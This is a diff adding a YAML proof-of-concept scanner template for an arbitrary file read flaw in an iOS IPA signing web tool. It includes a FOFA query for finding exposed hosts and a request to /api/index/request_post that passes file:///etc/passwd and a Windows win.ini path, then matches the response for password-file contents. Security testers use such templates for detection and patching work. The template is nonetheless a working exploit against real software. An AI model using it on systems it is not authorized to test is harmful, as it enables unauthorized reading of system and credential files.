@@ -1,0 +1,24 @@
+id: poc-yaml-iso-ipa-request-post-fileread
+info:
+  name: 苹果IOS端IPA签名工具 request_post 任意文件读取漏洞
+  severity: high
+  tags:
+  - 命令注入
+  finger: 苹果IOS端IPA签名工具
+  fofa: body="/assets/index/css/mobileSelect.css"
+variables:
+  r_data_linux: 'file:///etc/passwd
+
+    file:///c://windows/win.ini'
+firstRequest:
+  method: GET
+  path: /
+  expression: "status_code == 200 && \ncontains(body,\"/assets/index/css/mobileSelect.css\"\
+    )\n"
+requests:
+- method: GET
+  path: /api/index/request_post?url={{.r_data_linux}}&post_data=1
+  expression: "status_code == 200 && (\n  ( \n    contains(body, \"bit app support\"\
+    ) && \n    contains(body,\"fonts\") &&\n    contains(body,\"extensions\") \n \
+    \ ) || (\n    matches(body, \"root:.*:0:0:\") \n  )\n)\n"
+transport: http
